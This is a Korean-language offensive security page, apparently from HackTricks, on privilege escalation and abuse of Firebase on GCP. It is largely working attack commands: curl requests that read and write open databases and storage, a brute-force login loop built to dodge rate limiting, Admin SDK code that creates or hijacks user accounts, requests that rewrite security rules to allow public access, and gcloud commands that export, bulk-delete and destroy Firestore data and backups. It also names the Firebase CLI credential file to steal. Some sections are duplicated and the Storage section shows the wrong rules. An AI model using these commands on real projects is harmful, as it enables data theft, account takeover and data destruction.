# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Firebase Realtime Database에 대한 인증되지 않은 접근
attacker는 이 공격을 수행하는 데 특정 Firebase 권한이 필요하지 않다. 이는 Firebase Realtime Database의 security rules가 취약하게 구성되어 `.read: true` 또는 `.write: true`로 설정되어 공개적으로 읽기/쓰기 접근을 허용하는 경우에 해당한다.

attacker는 데이터베이스 URL을 식별해야 하며, 일반적으로 형식은 다음과 같다: `https://<project-id>.firebaseio.com/`.

이 URL은 mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), google-services.json (Android) 또는 GoogleService-Info.plist (iOS)와 같은 구성 파일 분석, 웹 애플리케이션 소스 코드 검사, 또는 네트워크 트래픽 분석을 통해 `*.firebaseio.com` 도메인으로의 요청을 식별함으로써 찾을 수 있다.

attacker는 데이터베이스 URL을 확인하여 공개적으로 노출되었는지 검사한 후, 데이터를 조회하고 경우에 따라 악성 정보를 기록할 수 있다.

먼저, URL에 .json을 추가하여 데이터베이스가 읽기 접근을 허용하는지 확인한다.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
응답이 JSON 데이터나 null(대신 "Permission Denied")을 포함하면 데이터베이스에 읽기 접근이 허용됩니다. 쓰기 접근을 확인하려면 공격자가 Firebase REST API를 사용해 테스트 쓰기 요청을 전송해볼 수 있습니다.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
작업이 성공하면 데이터베이스는 write access도 허용합니다.

### Cloud Firestore의 데이터 노출
공격자는 이 공격을 수행하기 위해 특정 Firebase 권한이 필요하지 않습니다. 이는 Cloud Firestore security rules에서 규칙이 인증 없이 또는 검증이 불충분한 상태에서 read 또는 write access를 허용하는 취약한 구성만 있으면 됩니다. full access를 부여하는 잘못 구성된 규칙의 예는 다음과 같습니다:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
이 규칙은 누구나 모든 문서를 아무런 제한 없이 읽고 쓸 수 있도록 허용합니다. Firestore rules는 세밀하게 적용되며 컬렉션 및 문서 단위로 적용되므로, 특정 규칙의 오류는 일부 컬렉션만 노출시킬 수 있습니다.

공격자는 Firebase Project ID를 식별해야 하며, 이는 mobile app reverse engineering, google-services.json 또는 GoogleService-Info.plist와 같은 구성 파일 분석, 웹 애플리케이션의 소스 코드 검사, 또는 firestore.googleapis.com으로의 요청을 식별하기 위한 네트워크 트래픽 분석을 통해 찾을 수 있습니다.

The Firestore REST API는 다음 형식을 사용합니다:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
규칙에서 인증되지 않은 읽기 액세스를 허용하면, 공격자는 컬렉션과 문서를 읽을 수 있습니다. 먼저 특정 컬렉션에 접근을 시도합니다:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
응답이 권한 오류 대신 JSON 문서를 포함하면, 해당 컬렉션이 노출된 것입니다. 공격자는 일반적인 이름을 시도하거나 애플리케이션 구조를 분석하여 접근 가능한 모든 컬렉션을 열거할 수 있습니다. 특정 문서에 접근하려면:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
규칙이 인증되지 않은 쓰기 액세스를 허용하거나 검증이 불충분한 경우, 공격자는 새 문서를 생성할 수 있습니다:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
기존 문서를 수정하려면 PATCH를 사용해야 합니다:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
문서를 삭제하여 서비스 거부(DoS)를 발생시키려면:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Exposure of files in Firebase Storage
공격자는 이 공격을 수행하기 위해 특정 Firebase 권한이 필요하지 않습니다.  
필요한 것은 Firebase Storage의 security rules에 취약한 설정이 있어 규칙이 인증 없이 또는 불충분한 검증으로 read 또는 write 접근을 허용하는 것뿐입니다.  
Storage rules는 read와 write 권한을 독립적으로 제어하므로 규칙의 오류로 read 접근만, write 접근만 또는 둘 다 노출될 수 있습니다.  
전체 접근을 허용하는 잘못 구성된 규칙의 예는 다음과 같습니다:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
이 규칙은 모든 문서에 대해 어떠한 제한 없이 읽기 및 쓰기 접근을 허용합니다. Firestore 규칙은 세부적으로 컬렉션 및 문서 단위로 적용되므로 특정 규칙의 오류는 일부 컬렉션만 노출시킬 수 있습니다. 공격자는 Firebase Project ID를 식별해야 하며, 이는 모바일 애플리케이션 reverse engineering, google-services.json 또는 GoogleService-Info.plist 같은 구성 파일 분석, 웹 애플리케이션 소스 코드 검토, 또는 firestore.googleapis.com으로의 요청을 식별하기 위한 네트워크 트래픽 분석을 통해 찾을 수 있습니다.
The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

규칙이 인증되지 않은 읽기 접근을 허용하면 공격자는 컬렉션과 문서를 읽을 수 있습니다. 먼저, 특정 컬렉션에 접근하려 시도합니다.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
응답에 권한 오류 대신 파일 목록이 포함되어 있다면, 파일이 노출된 것입니다. 공격자는 경로를 지정하여 파일의 내용을 볼 수 있습니다:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
규칙이 인증되지 않은 쓰기 액세스를 허용하거나 검증이 불충분한 경우, 공격자는 악성 파일을 업로드할 수 있습니다. REST API를 통해 파일을 업로드하려면:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
공격자는 code shells, malware payloads 또는 대용량 파일을 업로드하여 denial of service를 유발할 수 있습니다. 애플리케이션이 업로드된 파일을 처리하거나 실행하면 공격자는 remote code execution을 달성할 수 있습니다. 파일을 삭제하고 denial of service를 일으키려면:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### 공개 Firebase Cloud Functions 호출
공격자는 이 문제를 악용하기 위해 특정 Firebase 권한이 필요하지 않으며, 단지 Cloud Function이 인증 없이 HTTP로 공개 접근 가능하면 된다.

함수가 취약한 경우는 보안 설정이 부적절할 때이다:

- functions.https.onRequest를 사용하며, 이는 인증을 강제하지 않는다(한편 onCall functions는 인증을 강제함).
- 함수의 코드가 사용자 인증을 검증하지 않는다(예: request.auth 또는 context.auth에 대한 체크가 없음).
- 함수가 IAM에서 공개 접근 허용되어 있고, 즉 allUsers가 roles/cloudfunctions.invoker 역할을 가지고 있다. 이는 개발자가 접근을 제한하지 않는 한 HTTP functions의 기본 동작이다.

Firebase HTTP Cloud Functions는 다음과 같은 URL을 통해 노출된다:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (Firebase Hosting과 통합된 경우)

공격자는 소스코드 분석, 네트워크 트래픽 검사, enumeration tools, 또는 모바일 앱 reverse engineering을 통해 이러한 URL을 찾아낼 수 있다.
함수가 공개되어 있고 인증이 없으면 공격자는 자격 증명 없이 직접 함수를 호출할 수 있다.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
함수가 입력을 적절히 검증하지 않으면, 공격자는 code injection이나 command injection과 같은 다른 공격을 시도할 수 있습니다.


### Brute-force attack — Firebase Authentication의 약한 비밀번호 정책에 대한 공격
공격자는 이 공격을 수행하기 위해 특정 Firebase 권한이 필요하지 않습니다. 모바일 또는 웹 애플리케이션에 Firebase API Key가 노출되어 있고, 비밀번호 정책이 기본값보다 더 엄격하게 구성되지 않은 경우에만 가능합니다.

공격자는 Firebase API Key를 식별해야 하며, 이는 모바일 앱 reverse engineering, google-services.json 또는 GoogleService-Info.plist와 같은 구성 파일 분석, 웹 애플리케이션 소스 코드 검사(예: bootstrap.js), 또는 네트워크 트래픽 분석을 통해 찾을 수 있습니다.

Firebase Authentication의 REST API는 이메일과 비밀번호로 인증하기 위해 다음 엔드포인트를 사용합니다:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`

Email Enumeration Protection이 비활성화된 경우, API 오류 응답은 해당 이메일이 시스템에 존재하는지 여부를 노출할 수 있습니다 (EMAIL_NOT_FOUND vs. INVALID_PASSWORD). 이는 공격자가 비밀번호 추측을 시도하기 전에 사용자를 열거(enumerate)할 수 있게 합니다. 이 보호 기능이 활성화되면, API는 존재하지 않는 이메일과 잘못된 비밀번호에 대해 동일한 오류 메시지를 반환하여 사용자 열거를 방지합니다.

Firebase Authentication은 rate limiting을 적용하여 짧은 시간에 너무 많은 인증 시도가 발생하면 요청을 차단할 수 있다는 점을 유의해야 합니다. 이 때문에 공격자는 rate-limited를 피하기 위해 시도 사이에 지연을 도입해야 합니다.

공격자는 API Key를 식별한 후 알려진 계정들에 대해 여러 비밀번호로 인증 시도를 수행합니다. Email Enumeration Protection이 비활성화된 경우, 공격자는 오류 응답을 분석하여 기존 사용자를 열거할 수 있습니다:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
응답에 EMAIL_NOT_FOUND가 포함되어 있으면 해당 이메일은 시스템에 존재하지 않습니다. INVALID_PASSWORD가 포함되어 있으면 이메일은 존재하지만 비밀번호가 틀려 사용자가 등록되어 있음을 확인할 수 있습니다. 유효한 사용자가 확인되면 공격자는 brute-force 시도를 수행할 수 있습니다. Firebase Authentication’s rate-limiting 메커니즘을 피하기 위해 시도 사이에 일시 중지를 포함하는 것이 중요합니다:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
기본 비밀번호 정책(최소 6자, 복잡성 요구사항 없음)에서는 attacker가 6자 비밀번호의 모든 가능한 조합을 시도할 수 있으며, 이는 더 엄격한 비밀번호 정책에 비해 비교적 작은 탐색 공간을 의미한다.

### Firebase Authentication에서 사용자 관리

이 공격을 수행하려면 attacker는 특정 Firebase Authentication 권한이 필요하다. 필요한 권한은:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

이 권한들은 Firebase Authentication 리소스에 대한 전체 읽기/쓰기 액세스를 부여하는 `roles/firebaseauth.admin` 역할에 포함되어 있다. 또한 모든 firebaseauth.* 권한을 포함하는 roles/firebase.developAdmin(모든 firebaseauth.* 권한 포함)이나 모든 Firebase 서비스에 대한 전체 액세스를 제공하는 roles/firebase.admin 같은 상위 역할에도 포함되어 있다.

Firebase Admin SDK를 사용하려면 attacker는 서비스 계정 자격증명(JSON 파일)에 접근해야 하며, 이는 침해된 시스템, 공개적으로 노출된 코드 저장소, 침해된 CI/CD 시스템, 또는 이러한 자격증명에 접근 권한이 있는 개발자 계정의 침해를 통해 발견될 수 있다.

첫 단계는 서비스 계정 자격증명으로 Firebase Admin SDK를 구성하는 것이다.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
victim’s email을 사용해 악의적인 사용자를 생성하려는 attacker는 Firebase Admin SDK를 사용해 해당 이메일로 새 계정을 만들려고 시도합니다.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
기존 사용자를 수정하려면 공격자는 이메일 주소, 인증 상태 또는 계정이 비활성화되어 있는지 여부와 같은 필드를 업데이트합니다.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
사용자 계정을 삭제하여 denial of service를 초래하려면, 공격자는 사용자를 완전히 제거하도록 요청을 전송한다.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
공격자는 UID나 이메일 주소를 요청하여 기존 사용자에 대한 정보를 조회할 수도 있습니다.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
또한 공격자는 사용자의 비밀번호를 변경하여 계정에 접근하기 위해 인증 링크나 비밀번호 재설정 링크를 생성할 수 있습니다.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication의 사용자 관리
공격자는 이 공격을 수행하기 위해 특정 Firebase Authentication 권한이 필요합니다. 필요한 권한은 다음과 같습니다:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

이 권한들은 roles/firebaseauth.admin 역할에 포함되어 있으며, Firebase Authentication 리소스에 대한 전체 읽기/쓰기 권한을 부여합니다. 또한 `roles/firebase.developAdmin`(모든 firebaseauth.* 권한 포함) 및 `roles/firebase.admin`(모든 Firebase 서비스에 대한 전체 액세스)과 같은 상위 역할의 일부이기도 합니다.

Firebase Admin SDK를 사용하려면 공격자는 서비스 계정 자격증명(서비스 계정 JSON 파일)에 접근해야 합니다. 이러한 자격증명은 침해된 시스템, 공개적으로 노출된 코드 저장소, 침해된 CI/CD 환경, 또는 해당 자격증명에 접근 권한이 있는 개발자 계정의 침해를 통해 얻을 수 있습니다.

첫 번째 단계는 서비스 계정 자격증명을 사용하여 Firebase Admin SDK를 구성하는 것입니다.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
악의적인 사용자를 만들기 위해 공격자는 피해자의 이메일을 사용해 그 이메일로 새 사용자 계정을 생성하고 자신의 비밀번호 및 프로필 정보를 지정하려 시도한다.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
기존 사용자를 수정하려면 공격자는 이메일 주소, 인증 상태 또는 계정이 비활성화되었는지 여부와 같은 필드를 변경합니다.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
사용자 계정을 삭제해—사실상 denial of service를 초래하는—공격자는 해당 사용자를 영구적으로 제거하도록 요청을 보냅니다.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
공격자는 UID 또는 email 주소로 사용자 세부 정보를 요청하여 UID나 email과 같은 기존 사용자 정보를 가져올 수도 있다.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
또한 attacker는 verification links 또는 password-reset links를 생성하여 사용자의 비밀번호를 변경하고 계정을 장악할 수 있다.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase 서비스의 보안 규칙 수정
공격자는 서비스에 따라 보안 규칙을 수정하기 위해 특정 권한이 필요합니다. Cloud Firestore 및 Firebase Cloud Storage의 경우 ruleset을 생성하려면 `firebaserules.rulesets.create`, 릴리스를 배포하려면 `firebaserules.releases.create` 권한이 필요합니다. 이 권한들은 `roles/firebaserules.admin` 역할 또는 `roles/firebase.developAdmin`, `roles/firebase.admin` 같은 상위 역할에 포함되어 있습니다. Firebase Realtime Database의 경우 필요한 권한은 `firebasedatabase.instances.update`입니다.

공격자는 보안 규칙을 수정하기 위해 Firebase REST API를 사용해야 합니다. 먼저 공격자는 서비스 계정 자격 증명(service account credentials)을 사용해 액세스 토큰(access token)을 얻어야 합니다. 토큰을 얻으려면:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Firebase Realtime Database 규칙을 수정하려면:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Cloud Firestore 규칙을 수정하려면, 공격자는 ruleset을 생성한 다음 배포해야 합니다:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
이전 명령은 projects/<project-id>/rulesets/<ruleset-id> 형식의 ruleset 이름을 반환합니다. 새 버전을 배포하려면 release를 PATCH 요청으로 업데이트해야 합니다:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Firebase Cloud Storage 규칙을 수정하려면:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
이전 명령은 projects/<project-id>/rulesets/<ruleset-id> 형식의 ruleset 이름을 반환합니다. 새 버전을 배포하려면 릴리스를 PATCH 요청으로 업데이트해야 합니다:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Cloud Firestore에서의 데이터 유출 및 조작
Cloud Firestore는 Cloud Datastore와 동일한 인프라 및 권한 시스템을 사용하므로 Datastore IAM 권한이 Firestore에 직접 적용됩니다. TTL 정책을 조작하려면 `datastore.indexes.update` 권한이 필요합니다. 데이터를 내보내려면 `datastore.databases.export` 권한이 필요합니다. 데이터를 가져오려면 `datastore.databases.import` 권한이 필요합니다. 대량 데이터 삭제를 수행하려면 `datastore.databases.bulkDelete` 권한이 필요합니다.

백업 및 복원 작업에는 다음과 같은 특정 권한이 필요합니다:

- `datastore.backups.get` 및 `datastore.backups.list` — 사용 가능한 백업을 나열하고 세부 정보를 조회하기 위해 필요합니다
- `datastore.backups.delete` — 백업을 삭제하기 위해 필요합니다
- `datastore.backups.restoreDatabase` — 백업에서 데이터베이스를 복원하기 위해 필요합니다
- `datastore.backupSchedules.create` 및 `datastore.backupSchedules.delete` — 백업 스케줄을 관리하기 위해 필요합니다

TTL 정책이 생성되면 삭제 대상이 될 엔터티를 식별하기 위해 지정된 속성이 선택됩니다. 이 TTL 속성은 Date and time 타입이어야 합니다. 공격자는 이미 존재하는 속성을 선택하거나 나중에 추가할 속성을 지정할 수 있습니다. 필드 값이 과거의 날짜이면 문서는 즉시 삭제 대상이 됩니다. 공격자는 gcloud CLI를 사용해 TTL 정책을 조작할 수 있습니다.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
데이터를 내보내고 exfiltrate하기 위해 공격자는 gcloud CLI를 사용할 수 있다.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
악성 데이터를 가져오기 위해:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
대규모 데이터 삭제를 수행하고 denial of service를 초래하기 위해, 공격자는 gcloud Firestore bulk-delete 도구를 사용해 전체 collections를 제거할 수 있다.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
백업 및 복원 작업을 위해 공격자는 데이터베이스의 현재 상태를 캡처하기 위해 예약된 백업을 생성하고, 기존 백업을 나열하고, 최근 변경사항을 덮어쓰기 위해 백업에서 복원하고, 영구적인 데이터 손실을 초래하기 위해 백업을 삭제하고, 예약된 백업을 제거할 수 있습니다.
즉시 백업을 생성하는 매일 백업 일정을 만들려면:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
특정 backup에서 복원하려면 공격자는 해당 backup에 포함된 데이터를 사용해 새 데이터베이스를 생성할 수 있다. 복원 작업은 backup의 데이터를 새 데이터베이스에 기록하므로 기존 DATABASE_ID는 사용할 수 없다.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
백업을 삭제하여 영구적인 데이터 손실을 초래하려면:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI 자격증명 도용 및 악용
공격자는 이 공격을 수행하기 위해 특정 Firebase 권한이 필요하지 않지만, 개발자의 로컬 시스템 또는 Firebase CLI 자격증명 파일에 대한 접근은 필요합니다.

해당 자격증명은 다음 위치의 JSON 파일에 저장됩니다:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

이 파일에는 refresh_token 및 access_token을 포함한 인증 토큰이 들어있어, 공격자가 원래 firebase login을 실행한 사용자로 인증할 수 있게 합니다.

공격자가 Firebase CLI 자격증명 파일에 접근하면, 해당 파일 전체를 자신의 시스템으로 복사한 뒤 Firebase CLI가 기본 위치에서 자격증명을 자동으로 사용하게 할 수 있습니다. 이렇게 하면 공격자는 그 사용자가 접근 가능한 모든 Firebase 프로젝트를 조회할 수 있습니다.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
